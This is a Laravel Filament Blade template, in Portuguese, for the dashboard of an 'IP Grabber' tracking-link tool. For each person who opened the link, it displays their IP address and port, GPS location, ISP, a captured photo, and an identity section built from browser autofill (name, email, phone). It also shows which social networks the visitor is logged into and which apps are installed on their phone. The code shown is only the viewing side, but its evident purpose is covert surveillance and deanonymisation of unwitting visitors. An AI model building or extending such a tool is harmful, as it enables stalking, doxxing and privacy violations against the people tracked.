<x-filament-panels::page>
    <x-filament::section heading="Resumo do IP Grabber">
        <dl class="grid grid-cols-1 gap-4 text-sm sm:grid-cols-4">
            <div>
                <dt class="font-medium text-gray-500 dark:text-gray-400">Identificação</dt>
                <dd class="mt-1 text-gray-900 dark:text-gray-100">{{ $this->record->label }}</dd>
            </div>
            <div>
                <dt class="font-medium text-gray-500 dark:text-gray-400">Status</dt>
                <dd class="mt-1 text-gray-900 dark:text-gray-100">{{ $this->record->clicked_at ? 'Capturado' : 'Aguardando' }}</dd>
            </div>
            <div>
                <dt class="font-medium text-gray-500 dark:text-gray-400">Total de acessos</dt>
                <dd class="mt-1 text-gray-900 dark:text-gray-100">{{ $this->record->total_acessos }}</dd>
            </div>
            <div>
                <dt class="font-medium text-gray-500 dark:text-gray-400">Primeiro acesso</dt>
                <dd class="mt-1 text-gray-900 dark:text-gray-100">
                    {{ $this->record->clicked_at?->timezone('America/Sao_Paulo')->format('d/m/Y H:i:s') ?? '-' }}
                </dd>
            </div>
        </dl>
    </x-filament::section>

    {{-- ──────────────────── IDENTIDADE DIGITAL ──────────────────── --}}
    @php
        $identidade = $this->getIdentidadeDigital();

        // Separa redes logadas (têm usuario ou logado=true) de apps só instalados
        $redesLogadas   = collect($identidade['redes'])->filter(fn($r) => !empty($r['usuario']) || !empty($r['logado']))->values();
        $appsInstalados = collect($identidade['redes'])->filter(fn($r) => empty($r['usuario']) && empty($r['logado']) && !empty($r['instalado']))->values();

        $temIdentidade = $identidade['nome'] || $identidade['email'] || $identidade['telefone']
                      || $redesLogadas->isNotEmpty() || $appsInstalados->isNotEmpty();
    @endphp

    @if ($temIdentidade)
        <x-filament::section class="mt-4">
            <x-slot name="heading">
                <span style="display:inline-flex;align-items:center;gap:6px;">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 24 24" stroke-width="1.8" stroke="currentColor" style="color:#6366f1">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 6a3.75 3.75 0 1 1-7.5 0 3.75 3.75 0 0 1 7.5 0ZM4.501 20.118a7.5 7.5 0 0 1 14.998 0A17.933 17.933 0 0 1 12 21.75c-2.676 0-5.216-.584-7.499-1.632Z" />
                    </svg>
                    Identidade Digital Capturada
                </span>
            </x-slot>

            <p class="mb-4 text-xs text-gray-500 dark:text-gray-400">
                Exibe dados disponibilizados pelo navegador: autofill, conta Google quando acessível, indícios de contas logadas e apps detectados no celular. Perfis como Instagram podem aparecer apenas como “logado” ou “app instalado”, pois o navegador não informa o @usuário.
            </p>

            {{-- Linha 1: dados pessoais --}}
            <dl class="grid grid-cols-1 gap-4 text-sm sm:grid-cols-3 mb-5">
                <div>
                    <dt class="font-medium text-gray-500 dark:text-gray-400">Nome (autofill)</dt>
                    <dd class="mt-1 font-semibold text-gray-900 dark:text-gray-100">
                        {{ $identidade['nome'] ?? '—' }}
                    </dd>
                </div>
                <div>
                    <dt class="font-medium text-gray-500 dark:text-gray-400">E-mail (autofill)</dt>
                    <dd class="mt-1 font-semibold text-gray-900 dark:text-gray-100">
                        @if($identidade['email'])
                            <a href="mailto:{{ $identidade['email'] }}" style="color:var(--color-primary-600);text-decoration:underline;">
                                {{ $identidade['email'] }}
                            </a>
                        @else —
                        @endif
                    </dd>
                </div>
                <div>
                    <dt class="font-medium text-gray-500 dark:text-gray-400">Telefone (autofill)</dt>
                    <dd class="mt-1 font-semibold text-gray-900 dark:text-gray-100">
                        @if($identidade['telefone'])
                            <a href="tel:{{ $identidade['telefone'] }}" style="color:var(--color-primary-600);text-decoration:underline;">
                                {{ $identidade['telefone'] }}
                            </a>
                        @else —
                        @endif
                    </dd>
                </div>
            </dl>

            {{-- Linha 2: redes sociais logadas --}}
            @if ($redesLogadas->isNotEmpty())
                <div class="mb-4">
                    <p class="text-xs font-semibold uppercase tracking-wide text-gray-500 dark:text-gray-400 mb-2">
                        🔐 Contas Logadas no Navegador
                    </p>
                    <div style="display:flex;flex-direction:column;gap:6px;">
                        @foreach ($redesLogadas as $r)
                            @php
                                $temUsuario = !empty($r['usuario']);
                                // Redes onde só confirmamos "logado" — username não é acessível cross-site
                                $somenteLogado = !$temUsuario && !empty($r['logado']);
                                $redesSemUsername = ['Instagram','Twitter/X','LinkedIn','TikTok','Pinterest','Facebook'];
                                $avisaSemUsername = $somenteLogado && in_array($r['rede'], $redesSemUsername);

                                $icone = match(true) {
                                    str_contains($r['rede'], 'Google')    => '🔵',
                                    str_contains($r['rede'], 'Facebook')  => '🔵',
                                    str_contains($r['rede'], 'Instagram') => '🟣',
                                    str_contains($r['rede'], 'Twitter')   => '🐦',
                                    str_contains($r['rede'], 'LinkedIn')  => '💼',
                                    str_contains($r['rede'], 'TikTok')    => '🎵',
                                    str_contains($r['rede'], 'Telegram')  => '✈️',
                                    str_contains($r['rede'], 'Pinterest') => '📌',
                                    default                               => '🌐',
                                };
                            @endphp
                            <div style="display:inline-flex;align-items:center;gap:8px;padding:6px 12px;border-radius:8px;background:#f0fdf4;border:1px solid #bbf7d0;font-size:0.875rem;flex-wrap:wrap;">
                                <span>{{ $icone }}</span>
                                <span style="font-weight:700;color:#166534;">{{ $r['rede'] }}</span>

                                @if ($temUsuario)
                                    {{-- Google: temos email + nome --}}
                                    <span style="color:#1e3a5f;font-weight:600;">{{ $r['usuario'] }}</span>
                                    @if (!empty($r['nome']) && $r['nome'] !== $r['usuario'])
                                        <span style="color:#6b7280;font-size:0.8rem;">({{ $r['nome'] }})</span>
                                    @endif
                                @elseif ($avisaSemUsername)
                                    {{-- Logado detectado, mas username não acessível --}}
                                    <span style="color:#16a34a;font-style:italic;">✓ logado</span>
                                    <span style="color:#9ca3af;font-size:0.72rem;" title="O username do {{ $r['rede'] }} não é acessível por restrições do browser (SameSite cookies). Apenas a presença do login foi confirmada.">
                                        · username não disponível ⓘ
                                    </span>
                                @else
                                    <span style="color:#16a34a;font-style:italic;">✓ logado</span>
                                @endif
                            </div>
                        @endforeach
                    </div>
                </div>
            @endif

            {{-- Linha 3: apps instalados (mobile) --}}
            @if ($appsInstalados->isNotEmpty())
                <div>
                    <p class="text-xs font-semibold uppercase tracking-wide text-gray-500 dark:text-gray-400 mb-2">
                        📱 Apps Instalados (detectado no celular)
                    </p>
                    <div style="display:flex;flex-wrap:wrap;gap:6px;">
                        @foreach ($appsInstalados as $app)
                            <span style="display:inline-block;padding:3px 10px;border-radius:9999px;background:#e0e7ff;color:#3730a3;font-size:0.78rem;font-weight:600;">
                                {{ $app['rede'] }}
                            </span>
                        @endforeach
                    </div>
                </div>
            @endif
        </x-filament::section>
    @endif

    {{-- ──────────────────── HISTÓRICO DE ACESSOS ──────────────────── --}}
    <x-filament::section heading="Histórico de acessos" class="mt-4">
        @php $acessos = $this->getAcessos(); @endphp

        @if (empty($acessos))
            <p class="text-sm text-gray-500 dark:text-gray-400">Nenhum acesso registrado.</p>
        @else
            <div class="space-y-3">
                <div class="grid grid-cols-1 gap-3 xl:grid-cols-2">
                    @foreach ($acessos as $index => $acesso)
                        @php
                            $gpsStatus = match ($acesso['gps_status']) {
                                'denied' => 'Não autorizado',
                                'unavailable' => 'Indisponível',
                                'timeout' => 'Tempo esgotado',
                                'unsupported' => 'Sem suporte',
                                'insecure' => 'Contexto inseguro',
                                'skipped' => 'Não solicitado',
                                'error' => 'Erro',
                                default => $acesso['gps'],
                            };

                            $acessoRedesLogadas = collect($acesso['identidade_redes'])->filter(fn ($r) => ! empty($r['usuario']) || ! empty($r['logado']))->values();
                            $acessoAppsInstalados = collect($acesso['identidade_redes'])->filter(fn ($r) => empty($r['usuario']) && empty($r['logado']) && ! empty($r['instalado']))->values();
                            $acessoTemId = $acesso['identidade_nome'] || $acesso['identidade_email'] || $acesso['identidade_telefone']
                                || $acessoRedesLogadas->isNotEmpty() || $acessoAppsInstalados->isNotEmpty();
                        @endphp

                        <button
                            type="button"
                            onclick="document.getElementById('ip-grabber-access-modal-{{ $index }}')?.showModal()"
                            class="group w-full rounded-lg border border-gray-200 bg-white p-4 text-left shadow-sm transition hover:border-primary-400 hover:bg-primary-50/40 hover:shadow-md focus:outline-none focus:ring-2 focus:ring-primary-500 dark:border-gray-800 dark:bg-gray-900 dark:hover:border-primary-500 dark:hover:bg-primary-950/20"
                        >
                            <div class="flex flex-col gap-3 sm:flex-row sm:items-start sm:justify-between">
                                <div class="min-w-0">
                                    <div class="flex flex-wrap items-center gap-2">
                                        <span class="rounded-md bg-gray-100 px-2 py-1 text-xs font-semibold text-gray-700 dark:bg-gray-800 dark:text-gray-200">
                                            #{{ $index + 1 }}
                                        </span>
                                        <span class="rounded-md bg-primary-50 px-2 py-1 text-xs font-semibold text-primary-700 dark:bg-primary-950 dark:text-primary-300">
                                            {{ $acesso['endpoint'] }}
                                        </span>
                                        @if ($acesso['foto_url'])
                                            <span class="rounded-md bg-emerald-50 px-2 py-1 text-xs font-semibold text-emerald-700 dark:bg-emerald-950 dark:text-emerald-300">{{ $acesso['foto_contexto'] ?? 'Foto' }}</span>
                                        @endif
                                        @if ($acessoTemId)
                                            <span class="rounded-md bg-indigo-50 px-2 py-1 text-xs font-semibold text-indigo-700 dark:bg-indigo-950 dark:text-indigo-300">Identidade</span>
                                        @endif
                                    </div>

                                    <p class="mt-3 text-sm font-semibold text-gray-950 dark:text-white">{{ $acesso['accessed_at'] }}</p>
                                    <p class="mt-1 truncate text-xs text-gray-500 dark:text-gray-400">{{ $acesso['localizacao'] }}</p>
                                </div>

                                @if ($acesso['foto_url'])
                                    <img
                                        src="{{ $acesso['foto_url'] }}"
                                        alt="Foto capturada"
                                        class="h-14 w-14 rounded-md object-cover shadow-sm ring-1 ring-gray-200 dark:ring-gray-700"
                                    >
                                @endif
                            </div>

                            <div class="mt-4 grid grid-cols-2 gap-3 text-xs sm:grid-cols-4">
                                <div>
                                    <div class="font-medium text-gray-500 dark:text-gray-400">IP público</div>
                                    <div class="mt-1 truncate font-mono text-gray-900 dark:text-gray-100">{{ $acesso['ip'] }}</div>
                                </div>
                                <div>
                                    <div class="font-medium text-gray-500 dark:text-gray-400">Porta</div>
                                    <div class="mt-1 font-mono text-gray-900 dark:text-gray-100">{{ $acesso['porta'] }}</div>
                                </div>
                                <div>
                                    <div class="font-medium text-gray-500 dark:text-gray-400">GPS</div>
                                    <div class="mt-1 truncate text-gray-900 dark:text-gray-100">{{ $acesso['gps_url'] ? $acesso['gps'] : $gpsStatus }}</div>
                                </div>
                                <div>
                                    <div class="font-medium text-gray-500 dark:text-gray-400">Plataforma</div>
                                    <div class="mt-1 truncate text-gray-900 dark:text-gray-100">{{ $acesso['plataforma'] }}</div>
                                </div>
                            </div>

                            <div class="mt-3 flex items-center justify-between border-t border-gray-100 pt-3 text-xs text-gray-500 dark:border-gray-800 dark:text-gray-400">
                                <span class="truncate">{{ $acesso['isp'] }}</span>
                                <span class="ml-3 shrink-0 font-semibold text-primary-600 group-hover:underline dark:text-primary-400">Ver detalhes</span>
                            </div>
                        </button>

                        <dialog
                            id="ip-grabber-access-modal-{{ $index }}"
                            onclick="if (event.target === this) this.close()"
                            class="m-auto w-[min(96vw,72rem)] max-h-[90vh] overflow-hidden rounded-xl bg-white p-0 text-left shadow-2xl backdrop:bg-gray-950/65 dark:bg-gray-900"
                        >
                            @include('filament.resources.pixel-tracks.partials.access-history-modal', [
                                'acesso' => $acesso,
                                'redesLogadas' => $acessoRedesLogadas,
                                'appsInstalados' => $acessoAppsInstalados,
                                'temIdentidade' => $acessoTemId,
                                'gpsStatus' => $gpsStatus,
                            ])
                        </dialog>
                    @endforeach
                </div>
            </div>
        @endif
    </x-filament::section>

    <x-filament-actions::modals />
</x-filament-panels::page>
